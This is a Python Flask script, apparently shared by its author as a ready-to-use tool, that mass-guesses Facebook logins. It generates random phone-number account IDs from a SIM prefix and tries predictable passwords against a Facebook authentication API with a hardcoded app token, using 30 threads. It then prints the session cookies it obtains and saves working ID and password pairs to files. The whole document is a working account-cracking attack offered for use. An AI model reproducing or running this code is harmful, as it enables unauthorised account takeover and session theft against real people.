# WRITTEN BY MR.DIPTO
# FOLLOW : https://github.com/MR-DIPTO-404
#------------- import -------------#
import os
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
from fake_useragent import UserAgent
from flask import Flask, request, render_template_string

app = Flask(__name__)

#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [B, C, P, H]
warna = random.choice(my_color)
oks = []
cps = []
loop = 0

# Initialize fake user agent
ua = UserAgent()

#-------------logo-----------------#
logo = f'''{B}
`7MM"""Mq. `7MMF' `7MN.   `7MF'  .g8"""bgd
{warna}  MM   `MM.  MM     MMN.    M  .dP'     `M
{B}  MM   ,M9   MM     M YMb   M  dM'       `
{warna}  MMmmdM9    MM     M  `MN. M  MM
 {B} MM         MM     M   `MM.M  MM.    `7MMF'
{warna}  MM         MM     M     YMM  `Mb.     MM
{B}.JMML.     .JMML. .JML.    YM    `"bmmmdPY
{warna}--------------------------------------------{B}
 Owner    : {C} MR.DIPTO {B}
 Github   : MR-DIPTO-404
 Facebook : ADRIAN DIPTO
 Tools    : F{C}/{B}R{C}/{B}G{M} •{warna}[{H}TRAIL{warna}]{warna}
--------------------------------------------{B}'''

#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')

#-------------clear def -------------#
def clear():
    os.system('clear')
    print(logo)

#------------ method crack def ---------#
def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s' % (loop, len(oks)))
            sys.stdout.flush()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            datax = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header = {'User-Agent': ua.random, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url = 'https://api.facebook.com/method/auth.login'
            reqx = requests.post(url, data=datax, headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid = reqx['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[PING-OK] ' + str(uid) + ' | ' + pas + '\033[1;37m')
                    coki = ";".join(i["name"] + "=" + i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] ' + coki)
                    with open('/sdcard/PING-OK.txt', 'a') as f:
                        f.write(str(uid) + ' | ' + pas + '\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[PING-CP] ' + ids + ' | ' + pas + '\033[1;37m')
                with open('/sdcard/PING-CP.txt', 'a') as f:
                    f.write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except:
        pass

@app.route('/')
def home():
    return render_template_string('''
        <html>
        <head><title>MR.DIPTO Tool</title></head>
        <body>
            <h1>MR.DIPTO Tool</h1>
            <form action="/run" method="post">
                <label for="code">Enter SIM Code:</label><br>
                <input type="text" id="code" name="code" required><br>
                <label for="limit">Enter Limit:</label><br>
                <input type="number" id="limit" name="limit" min="1" required><br>
                <input type="submit" value="Run">
            </form>
        </body>
        </html>
    ''')

@app.route('/run', methods=['POST'])
def run():
    code = request.form['code']
    try:
        limit = int(request.form['limit'])
    except ValueError:
        limit = 50000
    
    user = []
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    
    with tred(max_workers=30) as Dipto:
        tl = str(len(user))
        print(' TOTAL ACCOUNT : ' + tl)
        print(' YOUR SIM CODE : ' + code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids = code + psx
            passlist = [psx, ids, ids[:7], ids[:6], ids[5:], ids[4:], 'sadiya', 'jannat']
            Dipto.submit(method_crack, ids, passlist)
    
    linex()
    results = f'THE PROGRESS HAS BEEN COMPLETE\nTOTAL OK ID {str(len(oks))}\nTOTAL CP ID {str(len(cps))}'
    return render_template_string(f'''
        <html>
        <head><title>MR.DIPTO Tool</title></head>
        <body>
            <h1>MR.DIPTO Tool</h1>
            <pre>{results}</pre>
            <a href="/">Back</a>
        </body>
        </html>
    ''')

if __name__ == '__main__':
    app.run(debug=True)
